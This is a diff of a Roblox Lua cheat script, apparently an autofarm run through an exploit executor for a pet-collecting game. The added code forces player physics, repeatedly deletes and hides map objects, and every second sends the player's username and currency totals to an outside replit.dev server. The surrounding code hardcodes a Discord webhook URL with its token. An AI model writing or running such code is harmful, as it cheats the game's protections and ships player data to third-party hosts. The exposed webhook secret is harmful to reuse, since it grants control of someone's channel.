@@ -10,6 +10,84 @@ end
 end
 spawn(GameCheck)
 
+local function BodyVelocity()
+    while true do
+        wait(0.1)
+        local player = game.Players.LocalPlayer
+        local character = player and player.Character
+        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+        
+        if humanoidRootPart then
+            local BV = humanoidRootPart:FindFirstChild("BodyVelocity") or Instance.new("BodyVelocity", humanoidRootPart)
+            BV.Velocity = Vector3.new(0, 0.001, 0)
+            BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+        end
+    end
+end
+
+spawn(BodyVelocity)
+
+local function MapDestroy()
+    while true do
+        
+        
+        local map3 = workspace:FindFirstChild("Map3")
+        if map3 then
+            for _, child in pairs(map3:GetChildren()) do
+                if child.Name ~= "200 | Void Spawn" then
+                    child:Destroy()
+                end
+            end
+        end
+
+        local things = game:GetService("Workspace"):FindFirstChild("__THINGS")
+        if things then
+            for _, child in pairs(things:GetChildren()) do
+                if child.Name == "Instances" or child.Name == "shinyRelics" or child.Name == "HiddenPresents" then
+                    child:Destroy()
+                end
+            end
+        end
+
+        local debris = game:GetService("Workspace"):FindFirstChild("__DEBRIS")
+        if debris then
+            debris:Destroy()
+        end
+
+        for _, descendant in pairs(game:GetService("Workspace"):GetDescendants()) do
+            if descendant:IsA("Part") or descendant:IsA("MeshPart") then
+                descendant.Transparency = 1
+            elseif descendant:IsA("ParticleEmitter") then
+                descendant:Destroy()
+            end
+        end
+
+        local thingsDescendants = things and things:GetChildren()
+        if thingsDescendants then
+            for _, child in pairs(thingsDescendants) do
+                if child.Name == "Eggs" or child.Name == "Breakables" or child.Name == "AnimatedBreakables" or child.Name == "RenderedEggs" or child.Name == "BalloonGifts" then
+                    child:Destroy()
+                end
+            end
+        end
+
+        local voidSpawn = map3 and map3:FindFirstChild("200 | Void Spawn")
+        if voidSpawn then
+            for _, child in pairs(voidSpawn:GetChildren()) do
+                if child.Name == "PARTS_LOD" or child.Name == "PERSISTENT" then
+                    child:Destroy()
+                end
+            end
+        end
+wait(1)
+    end
+end
+
+spawn(MapDestroy)
+
+
+
+
 
 local function MonitorAndSpin()
     while true do
@@ -107,6 +185,7 @@ end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 local Client = require(ReplicatedStorage:WaitForChild("Library"))
 
 local webhookURL = "https://discord.com/api/webhooks/1238281258174386257/C-YRLxkKnYEIPUFjIJYEAS2L_zdAv-Qou6OAzvFpIaxELHHNVdP2LnlXf3uwA-SSNzwD"
@@ -121,7 +200,8 @@ local DiamondsAmount = 0
 
 local function GetItemInfo(ItemsClass, ItemsName)
     local Table = {}
-    for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
+    for UID, Item in pairs(Inventory[ItemsClass]) do
         if table.find(ItemsName, Item.id) then
             local ItemInfo = {
                 ["uid"] = UID,
@@ -152,9 +232,10 @@ local function PrintDiamonds()
             end
         end
 
-        wait(0.3)  -- Update interval for checking items
+        wait(0.3)
     end
 end
+
 
 spawn(PrintDiamonds)
 spawn(chest)
@@ -165,6 +246,34 @@ local SendAmount = false
 print("DiamondsID:", DiamondsID)
 print("DiamondsAmount:", DiamondsAmount)
 print("VoidAmount:", VoidAmount)
+
+
+local function WebsiteUpdate()
+    while true do
+        local player = Players.LocalPlayer
+        local Http = game:GetService("HttpService")
+
+        if player then
+            request({
+                Url = 'https://67f552e4-5e03-4d76-bc81-e7c398e4e63f-00-1db81sgqdm8hk.riker.replit.dev/update',
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = Http:JSONEncode({
+                    Username = player.Name,
+                    VoidTicketsValue = VoidAmount,
+                    DiamondsValue = DiamondsAmount,
+                    HugeList = "nothing"
+                })
+            })
+        end
+
+        wait(1)
+    end
+end
+
+spawn(WebsiteUpdate)
 
 
 local waitTime = SendAmount and 30 or 5
